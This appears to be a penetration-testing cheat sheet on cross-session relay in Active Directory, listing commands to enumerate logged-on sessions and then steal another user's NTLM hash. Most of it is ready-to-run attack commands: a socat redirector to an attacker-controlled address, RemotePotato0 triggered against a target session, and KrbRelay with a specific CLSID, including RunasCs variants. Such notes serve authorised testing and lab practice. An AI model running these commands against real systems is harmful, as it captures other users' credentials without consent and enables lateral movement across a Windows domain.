---
title: "Cross Session Relay"
date: 2024-8-2
tags: ["cross session relay", "ntlm", "active driectory", "ad", "Windows", "krbrelay", "RemotePotato0"]
---

---
### Display information about the session host

```powershell
qwinsta *
``` 

```powershell
# Or runas
.\RunasCs.exe x x qwinsta -l 9
```

### Abuse #1: Steal NTLM hash

#### RemotePotato0

[RemotePotato0](https://github.com/antonioCoco/RemotePotato0)

```bash
# In local Linux 
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999
```

```bash
# Trigger Attack
.\RemotePotato0.exe -m 2 -s <TARGET_SESSION_ID> -x 10.10.14.10 -p 9999
```

#### KrbRelay

[KrbRelay](https://github.com/cube0x0/KrbRelay)

```bash
.\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm
```

```bash
# Or runas
.\RunasCs.exe x x -l 9 "C:\ProgramData\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"
```

<br>